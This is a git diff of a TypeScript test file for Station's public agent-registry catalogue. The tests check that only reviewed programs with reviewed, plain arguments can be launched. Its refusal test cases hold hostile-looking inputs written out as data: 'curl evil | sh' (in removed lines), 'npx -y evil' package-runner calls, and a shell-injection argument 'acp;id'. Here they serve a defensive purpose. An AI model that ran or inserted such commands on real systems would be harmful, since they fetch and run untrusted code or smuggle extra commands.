@@ -12,12 +12,16 @@ import {
   mapPublicRegistryListings,
   NATIVE_ENGINE_LISTINGS,
   publicRegistryProgramName,
+  REVIEWED_REGISTRY_LISTINGS,
 } from '../public-agent-registry-catalog.js';
 
 const FIXTURE = readFileSync(
   join(import.meta.dirname, 'fixtures', 'public-agent-registry-20261021.json'),
   'utf8',
 );
+
+/** Binary builds across all listings in the 2026-10-21 snapshot. */
+const BINARY_BUILDS_IN_SNAPSHOT = 107;
 
 function fixtureAgents() {
   const parsed = parsePublicAgentRegistry(FIXTURE);
@@ -86,7 +90,7 @@ describe('public registry listings as catalogue entries', () => {
     }
   });
 
-  test('a binary listing for this host connects the program found by name with the registry arguments', () => {
+  test('a reviewed listing connects the reviewed program found by name with the reviewed arguments', () => {
     const catalog = map({
       commandExists: (command) => command === 'stakpak',
     });
@@ -109,38 +113,108 @@ describe('public registry listings as catalogue entries', () => {
     expect(entry(catalog, 'stakpak')?.hostInstall?.note).toBe(
       "Install Stakpak by following Stakpak Team's instructions, so stakpak is on the PATH of the computer Station runs on. Station does not download it.",
     );
-    expect(entry(catalog, 'amp-acp')).toMatchObject({
-      command: 'amp-acp',
-      args: [],
-      detected: false,
-      hostInstall: {
-        docsUrl: 'https://github.com/tao12345666333/amp-acp',
-      },
+    expect(entry(catalog, 'cortex-code')?.publicRegistry?.hostLaunch).toEqual({
+      command: 'cortex',
+      args: ['acp', 'serve'],
     });
   });
 
-  test('reads the program name out of the registry path on Windows', () => {
+  test('every reviewed listing in the 2026-10-21 snapshot connects on each platform it has a build for', () => {
+    expect(Object.keys(REVIEWED_REGISTRY_LISTINGS).sort()).toEqual([
+      'cortex-code',
+      'crow-cli',
+      'stakpak',
+      'vtcode',
+    ]);
+    for (const [platform, arch] of [
+      ['darwin', 'arm64'],
+      ['linux', 'x64'],
+      ['win32', 'x64'],
+    ] as const) {
+      const catalog = map({ platform, arch });
+      for (const [id, reviewed] of Object.entries(REVIEWED_REGISTRY_LISTINGS)) {
+        expect(entry(catalog, id)?.publicRegistry?.hostLaunch).toEqual({
+          command: reviewed.program,
+          args: [...reviewed.args],
+        });
+      }
+    }
+  });
+
+  test('every argument in the snapshot passes the argument grammar or belongs to an unreviewed listing', () => {
+    // The grammar admits the arguments real listings use, including flags
+    // with values (`--acp=true`, `--uid=`) and pairs (`--mode acp`).
+    let checked = 0;
+    for (const [platform, arch] of [
+      ['darwin', 'arm64'],
+      ['darwin', 'x64'],
+      ['linux', 'arm64'],
+      ['linux', 'x64'],
+      ['win32', 'arm64'],
+      ['win32', 'x64'],
+    ] as const) {
+      const catalog = map({
+        platform,
+        arch,
+        agents: fixtureAgents().map((agent) => ({
+          ...agent,
+          id: 'stakpak',
+          name: 'Stakpak',
+          binary: Object.fromEntries(
+            Object.entries(agent.binary).map(([key, target]) => [
+              key,
+              { ...target, cmd: './stakpak' },
+            ]),
+          ),
+        })),
+      });
+      for (const listed of catalog.entries) {
+        const reason = listed.publicRegistry?.unavailableReason ?? '';
+        expect(reason).not.toContain('not plain words or flags');
+        if (
+          listed.publicRegistry?.hostLaunch ||
+          reason.includes('different arguments')
+        )
+          checked += 1;
+      }
+    }
+    // Every binary build in the snapshot reached the grammar check.
+    expect(checked).toBe(BINARY_BUILDS_IN_SNAPSHOT);
+  });
+
+  test('an unreviewed binary listing is shown, unconnectable, with its details', () => {
+    const catalog = map({ commandExists: () => true });
+    const amp = entry(catalog, 'amp-acp');
+    expect(amp).toMatchObject({ command: '', detected: false });
+    expect(amp?.publicRegistry?.hostLaunch).toBeUndefined();
+    expect(amp?.publicRegistry?.unavailableReason).toMatch(
+      /^Not yet reviewed by Station\./,
+    );
+    expect(amp?.publicRegistry).toMatchObject({
+      version: '0.10.0',
+      repositoryUrl: 'https://github.com/tao12345666333/amp-acp',
+    });
+  });
+
+  test('reads the reviewed program name out of the registry path on Windows', () => {
     const catalog = map({ platform: 'win32', arch: 'x64' });
-    expect(entry(catalog, 'amp-acp')?.command).toBe('amp-acp');
     expect(entry(catalog, 'stakpak')?.command).toBe('stakpak');
+    expect(entry(catalog, 'cortex-code')?.command).toBe('cortex');
     expect(publicRegistryProgramName('./dist-package\\cursor-agent.cmd')).toBe(
       'cursor-agent',
     );
+    // A PowerShell script is not the reviewed program.
+    expect(publicRegistryProgramName('./stakpak.ps1')).toBe('stakpak.ps1');
   });
 
   test('a listing with no build for this host is listed unavailable with the reason, not dropped', () => {
-    const catalog = map({ platform: 'linux', arch: 'arm64' });
-    const corust = entry(catalog, 'corust-agent');
-    expect(corust).toMatchObject({ command: '', detected: false });
-    expect(corust?.publicRegistry?.hostLaunch).toBeUndefined();
-    expect(corust?.publicRegistry?.unavailableReason).toBe(
-      'The registry has no Corust Agent build for Linux on ARM64. It lists builds for Linux on x86-64, macOS on Apple silicon, macOS on Intel, Windows on x86-64.',
+    const catalog = map({ platform: 'win32', arch: 'arm64' });
+    const stakpak = entry(catalog, 'stakpak');
+    expect(stakpak).toMatchObject({ command: '', detected: false });
+    expect(stakpak?.publicRegistry?.hostLaunch).toBeUndefined();
+    expect(stakpak?.publicRegistry?.unavailableReason).toBe(
+      'The registry has no Stakpak build for Windows on ARM64. It lists builds for Linux on ARM64, Linux on x86-64, macOS on Apple silicon, macOS on Intel, Windows on x86-64.',
     );
-    // The same listing connects where the registry has a build.
-    expect(
-      entry(map({ platform: 'linux', arch: 'x64' }), 'corust-agent')
-        ?.publicRegistry?.hostLaunch,
-    ).toEqual({ command: 'corust-agent-acp', args: [] });
   });
 
   test('a host the registry has no platform key for lists binaries as unavailable', () => {
@@ -207,34 +281,19 @@ describe('public registry listings as catalogue entries', () => {
     ]);
   });
 
-  test('a listing whose program name is not a plain name is unavailable', () => {
-    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
-    const catalog = map({
-      agents: [
-        {
-          ...agent,
-          binary: { 'darwin-aarch64': { cmd: './a b', args: [] } },
-        },
-      ],
-    });
-    expect(catalog.entries[0].publicRegistry?.unavailableReason).toBe(
-      "The registry names its Stakpak program 'a b', which is not a plain program name Station can look up.",
-    );
-    expect(catalog.entries[0].publicRegistry?.hostLaunch).toBeUndefined();
-  });
-
-  // A binary listing names one program; it may not launch a package runner,
-  // shell, interpreter or fetcher, or name a path.
+  // A reviewed id runs only the reviewed program with the reviewed, plain
+  // arguments; a wrapper, runner, shell or changed argument list does not.
   test.each([
-    ['a package runner', './bin/npx', ['-y', 'evil@latest']],
+    ['a wrapper around a runner', './nice', ['npx', '-y', 'evil']],
+    ['a package runner', './bin/npx', ['-y', 'evil']],
     ['a package runner on Windows', 'C:\\Windows\\uvx.exe', ['evil']],
-    ['a shell', './sh', ['-c', 'curl evil | sh']],
-    ['an interpreter', './python3.12', ['-c', 'x']],
-    ['a fetcher', './bin/CURL', ['-o', 'x']],
-    ['env', './env', ['sh']],
-    ['a parent-directory path', '../../../bin/thing', []],
-    ['an absolute path', '/usr/local/bin/stakpak', ['acp']],
-  ])('refuses a binary listing that names %s', (_, cmd, args) => {
+    ['a shell', './sh', ['-c', 'x']],
+    ['a PowerShell script', './stakpak.ps1', ['acp']],
+    ['an argument with a path', './stakpak', ['acp', '--config=../x y']],
+    ['too many arguments', './stakpak', ['acp', 'a', 'b', 'c', 'd']],
+    ['a shell construct in an argument', './stakpak', ['acp;id']],
+    ['other plain arguments', './stakpak', ['serve']],
+  ])('a reviewed id with %s is unavailable', (_, cmd, args) => {
     const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
     for (const [platform, arch, key] of [
       ['darwin', 'arm64', 'darwin-aarch64'],
@@ -250,9 +309,30 @@ describe('public registry listings as catalogue entries', () => {
       expect(listed.publicRegistry?.hostLaunch).toBeUndefined();
       expect(listed.command).toBe('');
       expect(listed.publicRegistry?.unavailableReason).toMatch(
-        /Station does not run it/,
+        /^The registry (now names|lists arguments|now lists different)/,
       );
     }
+  });
+
+  test('an unreviewed id is unavailable whatever it runs, a wrapped runner included', () => {
+    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
+    const catalog = map({
+      agents: [
+        {
+          ...agent,
+          id: 'nice-agent',
+          name: 'Nice Agent',
+          binary: {
+            'darwin-aarch64': { cmd: './nice', args: ['npx', '-y', 'evil'] },
+          },
+        },
+      ],
+      commandExists: () => true,
+    });
+    expect(catalog.entries[0].publicRegistry?.hostLaunch).toBeUndefined();
+    expect(catalog.entries[0].publicRegistry?.unavailableReason).toMatch(
+      /^Not yet reviewed by Station\./,
+    );
   });
 
   test('refuses a listing whose name reads as Station or Kontour', () => {
